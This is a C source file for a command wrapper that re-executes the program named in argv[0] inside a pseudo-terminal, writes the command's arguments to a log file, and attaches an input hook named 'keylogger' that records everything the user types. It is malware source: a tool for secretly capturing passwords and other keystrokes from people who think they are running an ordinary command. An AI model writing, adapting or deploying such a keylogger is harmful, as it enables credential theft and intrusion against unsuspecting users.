#include "tas/tas.h"
#include "tas/constructor.c"

#include <stdio.h>
#include <string.h>

#include <sys/wait.h>
#include <sys/types.h>
#include <fcntl.h>

#include "config.h"

void save_cmd(int fd, char **argv)
{
	FILE *fh = fdopen(fd, "w");
	if (fh == NULL)
		return;

	int i = 0;

	while (*argv) {
		fprintf(fh, "arg[%d] = %s\n", i, *argv);
		argv++, i++;
	}

	fprintf(fh, "\n");

	fflush(fh);
	fclose(fh);
}

int main(int argc, char **argv)
{
	tas_tty tty = TAS_TTY_INIT;
	struct termios tios;

	int status;

	if (argc == 0) {
		return 0;
	}

	char *tmp;
	if ((tmp = strrchr(argv[0], '/'))) {
		argv[0] = tmp + 1;
	}

	tty.output_fd = open(LOGFILE, O_WRONLY | O_APPEND | O_CREAT | O_CLOEXEC , 0644);
	if (tty.output_fd == -1) {
		tas_execv(argv[0], argv);
		return 0;
	}

	save_cmd(tty.output_fd, argv);

	pid_t pid = tas_forkpty(&tty);
	if (pid <= 0) {
		if (pid == -1)
			close(tty.master);

		tas_execv(argv[0], argv);
		return 0;
	}

	tty.input_hook = (void *) keylogger;
	tty.stdin_fd = STDIN_FILENO;

	// set to raw mode
	raw_mode(&tios, STDIN_FILENO);

	// rw loop
	tas_tty_loop(&tty);

	// restore
	tcsetattr(STDIN_FILENO, TCSAFLUSH, &tios);

	waitpid(pid, &status, 0);
	return status;
}
